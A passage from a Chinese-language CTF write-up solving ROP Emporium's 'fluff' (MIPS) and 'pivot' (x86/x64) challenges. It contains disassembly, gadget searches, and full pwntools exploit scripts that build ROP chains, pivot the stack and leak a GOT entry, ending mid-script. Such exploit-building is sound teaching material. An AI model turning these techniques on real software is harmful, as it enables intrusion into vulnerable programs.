8</span><br><span class=\"line\">.text:00400998</span><br><span class=\"line\">.text:0040099C 04 00 B9 8F                   lw      $t9, 4($sp)                      # gadget5 sw $s1, ($s0)</span><br><span class=\"line\">.text:004009A0 00 00 11 AE                   sw      $s1, 0($s0)</span><br><span class=\"line\">.text:004009A4 09 F8 20 03                   jalr    $t9</span><br><span class=\"line\">.text:004009A8 08 00 BD 23                   addi    $sp, 8</span><br><span class=\"line\">.text:004009A8</span><br><span class=\"line\">.text:004009AC 08 00 A4 8F                   lw      $a0, 8($sp)</span><br><span class=\"line\">.text:004009B0 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class=\"line\">.text:004009B4 09 F8 20 03                   jalr    $t9</span><br><span class=\"line\">.text:004009B8 0C 00 BD 23                   addi    $sp, 0xC</span><br></pre></td></tr></table></figure>\r\n<p>可以看到上述的gadget主要是对<em>s1</em>，<em>s2</em>，<em>s0</em> 寄存器进行操作，因此需要设计好gadget对完成对data段内写入数据。</p>\r\n<p>首先从<code>0040099C</code>处的 <strong>sw $s1, 0($s0)</strong> 指令开始分析，该指令将 <em>s1</em> 寄存器值写入 <em>s0</em> 寄存器值指向的地址处，因此需要控制写入 <em>s0</em> 和 <em>s1</em> 的数据，但gadget中没有直接写入<em>s0</em> 和 <em>s1</em>的指令，只有对 <em>s1</em> 赋值为0和交换<em>s0</em>、<em>s1值</em>的操作，但同时有对 <em>s2</em> 写入数据和 <em>s1</em>、<em>s2</em> 互相异或的操作，因此需要考虑如何利用对 <em>s2</em> 写入数据和 <em>s1</em>、<em>s2</em> 互相异或的操作实现对 <em>s0</em> 和 <em>s1</em> 写入数据。整体步骤如下：</p>\r\n<ol type=\"1\">\r\n<li>思考如何通过<code>xor $s1, $s2</code>，<code>$s1=0</code>，<code>$s2 = 4($sp)</code> 对 <em>s1</em> 写入数据，先使用gadget1对 <em>s1</em> 赋值为0，然后使用gadget2对 <em>s2</em> 赋值为相应数据，再通过gadget3异或操作实现对 <em>s1</em> 的数据写入。</li>\r\n<li>思考如何对 <em>s0</em> 写入数据，先通过步骤1实现对 <em>s1</em> 写入数据，再利用gadget4进行swap实现对 <em>s0</em> 数据写入。</li>\r\n<li>思考如何向data段内写入数据，先利用步骤1，2实现对 <em>s0</em> 写入字符，再利用步骤1实现对 <em>s1</em> 写入地址，然后利用gadget4交换 <em>s1</em> 和 <em>s2</em> 的值，此时 <em>s1</em> 值为字符，<em>s0</em> 值为地址，最后利用gadget5实现data段内写入字符。</li>\r\n<li>重复步骤1-3，再次写入剩余的字符，最后利用<code>0x004009AC</code>处gadget跳转到print_file函数。</li>\r\n</ol>\r\n<h4 id=\"编写exp-1\">编写exp</h4>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;mips&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-mipsel&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class=\"string\">&#x27;./fluff_mipsel&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">mov_s1_0 = <span class=\"number\">0x00400930</span></span><br><span class=\"line\">lw_t9_s2_jr_t9 = <span class=\"number\">0x0040094c</span></span><br><span class=\"line\">xor_s1_s2 = <span class=\"number\">0x00400964</span></span><br><span class=\"line\">sawp_s0_s1 = <span class=\"number\">0x0040097C</span></span><br><span class=\"line\">lw_t9_sw_s1_s0_jr_t9 = <span class=\"number\">0x0040099C</span></span><br><span class=\"line\">lw_a0_t9_jalr_t9 = <span class=\"number\">0x004009AC</span></span><br><span class=\"line\">print_file = <span class=\"number\">0x00400AF0</span></span><br><span class=\"line\">data_addr = <span class=\"number\">0x00411000</span></span><br><span class=\"line\">s = <span class=\"string\">b&quot;flag.txt&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">    payload += p32(mov_s1_0)        <span class=\"comment\"># s1 = 0</span></span><br><span class=\"line\">    payload += <span class=\"string\">b&quot;BBBB&quot;</span> * <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload += p32(lw_t9_s2_jr_t9)  <span class=\"comment\"># s2 = flag</span></span><br><span class=\"line\">    payload += <span class=\"string\">b&quot;CCCC&quot;</span></span><br><span class=\"line\">    payload += s[i*<span class=\"number\">4</span>:i*<span class=\"number\">4</span>+<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    payload += p32(xor_s1_s2)       <span class=\"comment\"># s1 = flag</span></span><br><span class=\"line\">    payload += <span class=\"string\">b&quot;DDDD&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload += p32(sawp_s0_s1)      <span class=\"comment\"># s0 = flag</span></span><br><span class=\"line\">    payload += <span class=\"string\">b&quot;EEEE&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload += p32(mov_s1_0)        <span class=\"comment\"># s1 = 0</span></span><br><span class=\"line\">    payload += <span class=\"string\">b&quot;BBBB&quot;</span> * <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload += p32(lw_t9_s2_jr_t9)  <span class=\"comment\"># s2 = data_addr</span></span><br><span class=\"line\">    payload += <span class=\"string\">b&quot;CCCC&quot;</span></span><br><span class=\"line\">    payload += p32(data_addr + i * <span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload += p32(xor_s1_s2)       <span class=\"comment\"># s1 = data_addr</span></span><br><span class=\"line\">    payload += <span class=\"string\">b&quot;DDDD&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload += p32(sawp_s0_s1)      <span class=\"comment\"># s1 = flag, s0 = data_addr</span></span><br><span class=\"line\">    payload += <span class=\"string\">b&quot;EEEE&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload += p32(lw_t9_sw_s1_s0_jr_t9)</span><br><span class=\"line\">    payload += <span class=\"string\">b&quot;FFFF&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(lw_a0_t9_jalr_t9)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;EEEE&quot;</span></span><br><span class=\"line\">payload += p32(print_file)</span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"运行结果-1\">运行结果</h4>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-mipsel&#x27;</span>: pid 3616</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">fluff by ROP Emporium</span><br><span class=\"line\">MIPS</span><br><span class=\"line\"></span><br><span class=\"line\">You know changing these strings means I have to rewrite my solutions...</span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"非预期解\">非预期解</h4>\r\n<p>由于含有直接写入s1和s0的gadget，可以借助该gadget对s1和s0写入合适数据，然后再调用print_file函数，这里只给出exp，利用原理和<a href=\"/2022/09/27/rop-emporium/\" title=\"rop emporium\">ROP Emporium</a>中的write4一样，不再进行详细讲解。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;mips&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-mipsel&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class=\"string\">&#x27;./fluff_mipsel&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">lw_ra_s1_s0_jr_ra = <span class=\"number\">0x00400aac</span></span><br><span class=\"line\">lw_t9_sw_s1_s0_jr_t9 = <span class=\"number\">0x0040099C</span></span><br><span class=\"line\">lw_a0_t9_jalr_t9 = <span class=\"number\">0x004009AC</span></span><br><span class=\"line\">print_file = <span class=\"number\">0x00400AF0</span></span><br><span class=\"line\">data_addr = <span class=\"number\">0x00411000</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\">payload += p32(lw_ra_s1_s0_jr_ra)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;BBBB&quot;</span> * <span class=\"number\">7</span></span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;flag&quot;</span></span><br><span class=\"line\">payload += p32(lw_t9_sw_s1_s0_jr_t9)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;CCCC&quot;</span></span><br><span class=\"line\">payload += p32(lw_ra_s1_s0_jr_ra)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;DDDD&quot;</span> * <span class=\"number\">7</span></span><br><span class=\"line\">payload += p32(data_addr+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;.txt&quot;</span></span><br><span class=\"line\">payload += p32(lw_t9_sw_s1_s0_jr_t9)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;CCCC&quot;</span></span><br><span class=\"line\">payload += p32(lw_a0_t9_jalr_t9)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;EEEE&quot;</span></span><br><span class=\"line\">payload += p32(print_file)</span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h2 id=\"pivot\">pivot</h2>\r\n<p>此类型题的考点在于如果栈溢出空间不够，如何进行栈迁移使得能够继续构造pop链。</p>\r\n<h3 id=\"x86和x64-1\">x86和x64</h3>\r\n<ol type=\"1\">\r\n<li><p>x86</p>\r\n<h4 id=\"分析-2\">分析</h4>\r\n<p>首先查看关键漏洞函数：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">pwnme</span><span class=\"params\">(<span class=\"type\">void</span> *buf)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [esp+0h] [ebp-28h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Call ret2win() from libpivot&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The Old Gods kindly bestow upon you a place to pivot: %p\\n&quot;</span>, buf);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Send a ROP chain now and it will land there&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x100</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Now please send your stack smash&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x38</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *ptr; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;pivot by ROP Emporium&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;x86\\n&quot;</span>);</span><br><span class=\"line\">  ptr = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x1000000</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Failed to request space for pivot stack&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  pwnme(ptr + <span class=\"number\">16776960</span>);</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\nExiting&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>发现程序进行了两次读取数据，第1次读取0x100个字节到动态分配的空间上(结合main函数可以看出)，第2次读取0x38个字节到数组s上，而数组s空间大小为0x28，因此栈只能溢出0x10个字节，没有足够空间构造pop链，需要进行栈迁移。</p>\r\n<p>而<code>pivot32</code>中没有后门函数，查看<code>libpivot32.so</code>，发现该文件中存在后门函数<code>ret2win</code>，但是该函数没有导入到<code>pivot32</code>中，因此无法直接利用。同时查看到该文件中的<code>foothold_function</code>函数提示 <strong>Check out my .got.plt entry to gain a foothold into libpivot</strong>，因此想到需要利用<code>foothold .got.plt表项</code>泄露出foothold的真实地址，添加上ret2win函数与foothold_function函数的偏移即可以泄露出ret2win的真实地址。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __noreturn <span class=\"title function_\">ret2win</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  FILE *stream; <span class=\"comment\">// [esp+4h] [ebp-34h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [esp+Bh] [ebp-2Dh]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v2; <span class=\"comment\">// [esp+2Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  stream = fopen(<span class=\"string\">&quot;flag.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !stream )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Failed to open file: flag.txt&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  fgets(&amp;s, <span class=\"number\">33</span>, stream);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(&amp;s);</span><br><span class=\"line\">  fclose(stream);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">foothold_function</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>由于需要进行栈迁移，查看能够修改sp的相关gadget(存在很多)：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary pivot32 --only <span class=\"string\">&quot;leave|ret&quot;</span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x080485f5 : leave ; ret</span><br><span class=\"line\">0x08048492 : ret</span><br><span class=\"line\">0x0804861e : ret 0xeac1</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 3</span><br></pre></td></tr></table></figure>\r\n<blockquote>\r\n<p>leave指令相当于mov esp, ebp; pop ebp</p>\r\n</blockquote>\r\n<p>可以利用<code>0x080485f5</code>处指令将栈帧esp指向栈基址ebp，而ebp寄存器在进行跳转前已经被修改为泄露地址，因此通过<strong>leave; ret</strong> 实现了栈迁移，其构造栈空间数据如下：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">-+----------------+-</span><br><span class=\"line\"> +  padding       +</span><br><span class=\"line\"> +----------------+</span><br><span class=\"line\"> + 修改的ebp       + 为pwnme函数中泄露出来的地址</span><br><span class=\"line\"> +----------------+</span><br><span class=\"line\"> + 0x080485f5(ra) +</span><br><span class=\"line\"> +----------------+</span><br></pre></td></tr></table></figure>\r\n<p>通过栈迁移，已经解决了栈空间不够的情况，接下来在新开辟的栈上需要继续构造pop链，调用ret2win函数，查看相关gadget：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:0804882C                               usefulGadgets:</span><br><span class=\"line\">.text:0804882C 58                            pop     eax</span><br><span class=\"line\">.text:0804882D C3                            retn</span><br><span class=\"line\">.text:0804882D</span><br><span class=\"line\">.text:0804882E                               ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:0804882E 94                            xchg    eax, esp</span><br><span class=\"line\">.text:0804882F C3                            retn</span><br><span class=\"line\">.text:0804882F</span><br><span class=\"line\">.text:08048830                               ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:08048830 8B 00                         mov     eax, [eax]</span><br><span class=\"line\">.text:08048832 C3                            retn</span><br><span class=\"line\">.text:08048832</span><br><span class=\"line\">.text:08048833                               ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:08048833 01 D8                         add     eax, ebx</span><br><span class=\"line\">.text:08048835 C3                            retn</span><br></pre></td></tr></table></figure>\r\n<p>可以利用<strong>pop eax</strong>和<strong>mov eax, [eax]</strong> 将foothold_function的真实地址写入eax寄存器，接下来需要将真实地址添加偏移，得到ret2win的真实地址，而 <strong>add eax, ebx</strong> 可以添加偏移，但首先需要将偏移写入ebx寄存器中，搜索写入ebx寄存器的gadget，结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary pivot32 --only <span class=\"string\">&quot;pop|ret&quot;</span> | grep ebx</span><br><span class=\"line\">0x08048898 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x080484a9 : pop ebx ; ret</span><br></pre></td></tr></table></figure>\r\n<p>因此可以利用<code>0x080484a9</code>处指令将偏移(事先计算出来)写入ebx寄存器，再通过<strong>add eax, ebx</strong>得到ret2win真实地址，最后需要直接调用该地址，搜索相关gadget：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary pivot32 --only <span class=\"string\">&quot;call&quot;</span> | grep eax</span><br><span class=\"line\">0x08048592 : call dword ptr [eax + 0x51]</span><br><span class=\"line\">0x0804858b : call dword ptr [eax - 0x73]</span><br><span class=\"line\">0x080485f0 : call eax</span><br></pre></td></tr></table></figure>\r\n<p>可以利用<code>0x080485f0</code>处指令直接调用eax寄存器，即调用ret2win函数。</p>\r\n<p>综上分析，在新栈上的数据构造如下：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">-+-------------------------+-</span><br><span class=\"line\"> +  foothold_function      +</span><br><span class=\"line\"> +-------------------------+</span><br><span class=\"line\"> + 0x804882C(pop eax)      +</span><br><span class=\"line\"> +-------------------------+</span><br><span class=\"line\"> +  foothold got plt       +</span><br><span class=\"line\"> +-------------------------+</span><br><span class=\"line\"> + 0x8048830(mov eax,[eax])+</span><br><span class=\"line\"> +-------------------------+</span><br><span class=\"line\"> + 0x80484a9(pop ebx)      +</span><br><span class=\"line\"> +-------------------------+</span><br><span class=\"line\"> +      offset             +</span><br><span class=\"line\"> +-------------------------+</span><br><span class=\"line\"> + 0x8048833(add eax, ebx) +</span><br><span class=\"line\"> +-------------------------+</span><br><span class=\"line\"> + 0x80485f0 (call eax)    +</span><br><span class=\"line\"> +-------------------------+</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"编写exp-2\">编写exp</h4>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./pivot32&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pivot32&#x27;</span>)</span><br><span class=\"line\">libp = ELF(<span class=\"string\">&#x27;./libpivot32.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">foothold_plt     = elf.plt[<span class=\"string\">&#x27;foothold_function&#x27;</span>] <span class=\"comment\"># 0x08048520</span></span><br><span class=\"line\">foothold_got_plt = elf.got[<span class=\"string\">&#x27;foothold_function&#x27;</span>] <span class=\"comment\"># 0x0804a024</span></span><br><span class=\"line\"></span><br><span class=\"line\">leave_ret    = <span class=\"number\">0x080485f5</span></span><br><span class=\"line\">pop_eax      = <span class=\"number\">0x0804882C</span></span><br><span class=\"line\">pop_ebx      = <span class=\"number\">0x080484a9</span></span><br><span class=\"line\">mov_eax_eax  = <span class=\"number\">0x08048830</span></span><br><span class=\"line\">add_eax_ebx  = <span class=\"number\">0x08048833</span></span><br><span class=\"line\">call_eax     = <span class=\"number\">0x080485F0</span></span><br><span class=\"line\">exit_addr    = <span class=\"number\">0x08048510</span></span><br><span class=\"line\"></span><br><span class=\"line\">foothold_sym = libp.symbols[<span class=\"string\">&#x27;foothold_function&#x27;</span>]</span><br><span class=\"line\">ret2win_sym  = libp.symbols[<span class=\"string\">&#x27;ret2win&#x27;</span>]</span><br><span class=\"line\">offset = <span class=\"built_in\">int</span>(ret2win_sym - foothold_sym) <span class=\"comment\"># 0x1f7</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;0x&quot;</span>)</span><br><span class=\"line\">leakaddr  = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">8</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_1  = p32(foothold_plt)</span><br><span class=\"line\">payload_1 += p32(pop_eax)</span><br><span class=\"line\">payload_1 += p32(foothold_got_plt)</span><br><span class=\"line\">payload_1 += p32(mov_eax_eax)</span><br><span class=\"line\">payload_1 += p32(pop_ebx)</span><br><span class=\"line\">payload_1 += p32(offset)</span><br><span class=\"line\">payload_1 += p32(add_eax_ebx)</span><br><span class=\"line\">payload_1 += p32(call_eax)</span><br><span class=\"line\">payload_1 += <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">0x10</span></span><br><span class=\"line\">payload_1 += p32(exit_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(payload_1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_2  = <span class=\"string\">b&quot;A&quot;</span>*<span class=\"number\">40</span></span><br><span class=\"line\">payload_2 += p32(leakaddr-<span class=\"number\">4</span>) + p32(leave_ret)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(payload_2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"运行结果-2\">运行结果</h4>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;./pivot32&#x27;</span>: pid 2040</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/lylan/CTF/PWN/rop_emporium_all_challenges/pivot32/pivot32&#x27;</span></span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">    RUNPATH:  b<span class=\"string\">&#x27;.&#x27;</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/lylan/CTF/PWN/rop_emporium_all_challenges/pivot32/libpivot32.so&#x27;</span></span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\"></span><br><span class=\"line\">Send a ROP chain now and it will land there</span><br><span class=\"line\">&gt; [*] Process <span class=\"string\">&#x27;./pivot32&#x27;</span> stopped with <span class=\"built_in\">exit</span> code 0 (pid 2040)</span><br><span class=\"line\">Thank you!</span><br><span class=\"line\"></span><br><span class=\"line\">Now please send your stack smash</span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure></li>\r\n<li><p>x64</p>\r\n<p>x64和x86利用原理一致，这里只给出exp：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./pivot&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pivot&#x27;</span>)</span><br><span class=\"line\">libp = ELF(<span class=\"string\">&#x27;./libpivot.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">foothold_plt     = elf.plt[<span class=\"string\">&#x27;foothold_function&#x27;</span>] </span><br><span class=\"line\">foothold_got_plt = elf.got[<span class=\"string\">&#x27;foothold_function&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">leave_ret    = <span class=\"number\">0x00000000004009A6</span></span><br><span class=\"line\">pop_rax      = <span class=\"number\">0x00000000004009BB</span></span><br><span class=\"line\">mov_rax_rax  = <span class=\"number\">0x00000000004009C0</span></span><br><span class=\"line\">pop_rbp      = <span class=\"number\">0x00000000004007C8</span></span><br><span class=\"line\">add_rax_rbp  = <span class=\"number\">0x00000000004009C4</span></span><br><span class=\"line\">jmp_rax      = <span class=\"number\">0x0000000000400803</span></span><br><span class=\"line\">exit_addr    = <span class=\"number\">0x0000000000400750</span></span><br><span class=\"line\"></span><br><span class=\"line\">foothold_sym = libp.symbols[<span class=\"string\">&#x27;foothold_function&#x27;</span>]</span><br><span class=\"line\">ret2win_sym  = libp.symbols[<span class=\"string\">&#x27;ret2win&#x27;</span>]</span><br><span class=\"line\">offset = <span class=\"built_in\">int</span>(ret2win_sym - foothold_sym) </span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;0x&quot;</span>)</span><br><span class=\"line\">leakaddr  = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">12</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_1  = p64(foothold_plt)</span><br><span class=\"line\">payload_1 += p64(pop_rax)</span><br><span class=\"line\">payload_1 += p64(foothold_got_plt)</span><br><span class=\"line\">payload_1 += p64(mov_rax_rax)</span><br><span class=\"line\">payload_1 += p64(pop_rbp)</span><br><span class=\"line\">payload_1 += p64(offset)</span><br><span class=\"line\">payload_1 += p64(add_rax_rbp)</span><br><span class=\"line\">payload_1 += p64(jmp_rax)</span><br><span class=\"line\">payload_1 += p64(exit_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload_1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_2  = <span 